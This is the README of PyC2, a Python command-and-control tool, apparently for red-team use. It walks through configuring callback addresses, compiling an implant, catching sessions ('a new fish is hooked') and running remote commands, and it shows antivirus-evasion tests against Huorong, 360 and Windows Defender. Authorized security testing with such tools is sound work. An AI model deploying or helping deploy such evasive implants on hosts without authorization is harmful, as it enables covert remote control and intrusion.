# python版简易Command and Control (C2) 

## 介绍

1. 使用socket建立网络传输
2. 解决了tcp粘包问题
3. 支持多个sessions切换
4. 跨平台支持windows/linux
5. 支持系统命令执行功能
6. 解决implant异常退出
7. 上线语音播报提示
8. 等等...

## 安装

环境

```
python >= 3.7
windows/linux
```

安装

````
git clone https://github.com/1derian/PyC2.git
cd PyC2
pip3 install -r requirements.txt
````

## 使用

编辑配置文件

```
vim settings.py

SERVER_LISTEN_IP = "127.0.0.1"  # c2server监听地址,如果是vps上使用,监听0.0.0.0,内网地址监听对应地址即可
SERVER_LISTEN_PORT = 7788       # c2server监听端口
AGENT_CONNECT_IP = "127.0.0.1"  # agent回连c2的ip地址
AGENT_CONNECT_PORT = 7788       # agent回连c2的端口
SERVER_LISTEN_NUM = 20          # c2server监听的个数
```

启动服务端

```
python3 pyc2server.py
```

由于python打包不支持跨平台编译 , 需要使用者在对应的平台上事先编译好

编译命令

```
windows
python3 gen.py -f implant.py -o implant.exe

linux
python3 gen.py -f implant.py -o implant
```

运行 implant , pyc2server收到对应的sessions链接

```
双击运行生成的 implant.exe

D:\PyC2>python3 pyc2server.py
[+](no_session) >新鱼上钩, 地址: ('127.0.0.1', 11142)

[+](no_session) >
```

查看sessions

```
[+](no_session) >sessions
1 ('127.0.0.1', 11142)
```

进入session , 并执行命令

```
[+](no_session) >sessions -i 1
('127.0.0.1', 11142)>whoami
win11\administrator
```

杀死 session

```
[+](no_session) >kill 1
[+](no_session) >sessions
当前sessions为空
```

查看帮助

```
[+](no_session) >help

        Command and Control (C2)

        sessions                          显示存活的session回话
        session -i *session id*           进入指定回话的shell,输入quite退出shell
        kill *session id*                 退出指定回话
        help                              打印帮助信息
        clear                             清空屏幕
        exit                              退出c2并关闭所有回话
```

清除当前终端内容

```
[+](no_session) > clear
```

退出pyc2server

```
[+](no_session) >exit

D:\PyC2>
```

## 免杀测试

火绒

![image-20220605141817304](https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220605141817304.png)

360

![image-20220605141848450](https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220605141848450.png)

windows defender

![image-20220605141903936](https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220605141903936.png)

## 免责声明🧐

本工具仅面向合法授权的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建测试环境。

在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。请勿对非授权目标进行扫描。

如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。
